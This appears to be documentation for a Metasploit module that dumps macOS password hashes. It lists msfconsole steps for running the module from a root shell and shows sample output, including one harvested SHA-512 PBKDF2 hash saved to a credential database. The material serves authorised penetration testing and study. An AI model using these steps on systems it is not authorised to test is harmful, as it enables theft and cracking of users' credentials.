## Vulnerable Application

This module dumps SHA-1, LM, NT, and SHA-512 Hashes on OSX. Supports versions 10.3 to 10.14.

## Verification Steps

  1. Start msfconsole
  2. Get a root privileged shell
  3. Do: ```use post/osx/gather/hashdump```
  4. Do: ```set session #```
  5. Do: ```run```
  6. You should see hashes dumped and stored to creds (if db is connected)

## Options

  **MATCHUSER**
  A regex to run against usernames.  Only matched usernames will have their hashes dumped.

## Scenarios

### User level shell on OSX 10.14.4

```
msf5 post(osx/gather/hashdump) > run

[-] Post aborted due to failure: bad-config: Insufficient Privileges: must be running as root to dump the hashes
[*] Post module execution completed
```

### Root level shell on OSX 10.14.4

```
msf5 post(osx/gather/hashdump) > run

[*] Attempting to grab shadow for user nobody...
[*] Attempting to grab shadow for user h00die...
[+] SHA-512 PBKDF2:h00die:$ml$67012$52a3da29923ab1680ae7c28b40a3ba7c2386c679af0392011f706c4ec2a22475$5c935f59a173d25bd4ed5cf59464930153198ea28b70d1e4bb5fe5e39828bec8347419dc53f0f0d93f08399f30b56adcd0f9a6f6e834ba33cba58d6b35fd1021bd81e63edf2a5b2265d8c4b7908d9bcfe127cbcd3c2092d2ab58f1b7a16dc3e11e0d5a7b027c254f3f91fdeb5acc92bcf5a3cc033319f5209f635c0494854a2e
[*] Credential saved in database.
[*] Attempting to grab shadow for user root...
[*] Attempting to grab shadow for user daemon...
[*] Attempting to grab shadow for user nobody...
[*] Attempting to grab shadow for user root...
[*] Attempting to grab shadow for user daemon...
[*] Post module execution completed
```
